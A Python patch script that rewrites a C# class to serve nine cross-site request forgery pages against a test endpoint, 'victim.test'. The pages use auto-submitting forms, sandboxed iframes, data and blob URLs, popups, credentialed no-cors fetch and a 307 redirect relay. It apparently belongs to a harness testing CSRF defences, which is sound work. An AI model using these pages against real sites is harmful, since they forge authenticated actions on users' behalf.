#!/usr/bin/env python3
from pathlib import Path

program = Path("Program.cs")
source = program.read_text(encoding="utf-8")
marker = "internal static class AttackPages\n{"

if source.count(marker) != 1:
    raise SystemExit("AttackPages marker count was not exactly one")

replacement = r'''internal static class AttackPages
{
    private const string VictimForm = "https://victim.test:5001/protected/form";

    public static string Render(string kind) => kind switch
    {
        "form-auto" => Page($"""
            <form id="attack" method="post" action="{VictimForm}">
              <input name="marker" value="form-auto">
            </form>
            <script>document.getElementById('attack').submit()</script>
            """),

        "form-click" => Page($"""
            <form method="post" action="{VictimForm}">
              <input name="marker" value="form-click">
              <button id="go" type="submit">go</button>
            </form>
            """),

        "sandbox-script" => Page($"""
            <iframe id="box" sandbox="allow-forms allow-scripts" srcdoc="
              &lt;form id='attack' method='post' action='{VictimForm}'&gt;
                &lt;input name='marker' value='sandbox-script'&gt;
              &lt;/form&gt;
              &lt;script&gt;document.getElementById('attack').submit()&lt;/script&gt;
            "></iframe>
            """),

        "sandbox-click" => Page($"""
            <iframe id="box" sandbox="allow-forms" srcdoc="
              &lt;form method='post' action='{VictimForm}'&gt;
                &lt;input name='marker' value='sandbox-click'&gt;
                &lt;button id='go' type='submit'&gt;go&lt;/button&gt;
              &lt;/form&gt;
            "></iframe>
            """),

        "data-iframe" => Page($"""
            <iframe id="box" src="data:text/html,{Uri.EscapeDataString($"<form id='attack' method='post' action='{VictimForm}'><input name='marker' value='data-iframe'></form><script>document.getElementById('attack').submit()</script>")}"></iframe>
            """),

        "blob-top" => Page($$"""
            <script>
              const html = `<form id="attack" method="post" action="{{VictimForm}}"><input name="marker" value="blob-top"></form><script>document.getElementById('attack').submit()<\/script>`;
              location.href = URL.createObjectURL(new Blob([html], { type: 'text/html' }));
            </script>
            """),

        "popup-write" => Page($$"""
            <button id="go">open</button>
            <script>
              document.getElementById('go').onclick = () => {
                const popup = window.open('about:blank', '_blank');
                popup.document.write(`<form id="attack" method="post" action="{{VictimForm}}"><input name="marker" value="popup-write"></form><script>document.getElementById('attack').submit()<\/script>`);
                popup.document.close();
              };
            </script>
            """),

        "fetch-no-cors" => Page($$"""
            <script>
              fetch('{{VictimForm}}', {
                method: 'POST',
                mode: 'no-cors',
                credentials: 'include',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'marker=fetch-no-cors'
              }).catch(() => {});
            </script>
            """),

        "redirect307" => Page("""
            <form id="attack" method="post" action="https://attacker.test:5002/relay307">
              <input name="marker" value="redirect307">
            </form>
            <script>document.getElementById('attack').submit()</script>
            """),

        _ => Page("<p>unknown attack kind</p>"),
    };

    private static string Page(string body) => $"""
        <!doctype html>
        <html>
          <head><meta charset="utf-8"><title>R64 attacker</title></head>
          <body>{body}</body>
        </html>
        """;
}
'''

prefix = source[: source.index(marker)]
program.write_text(prefix + replacement, encoding="utf-8")
print("R64_ATTACK_PAGES_PATCHED")
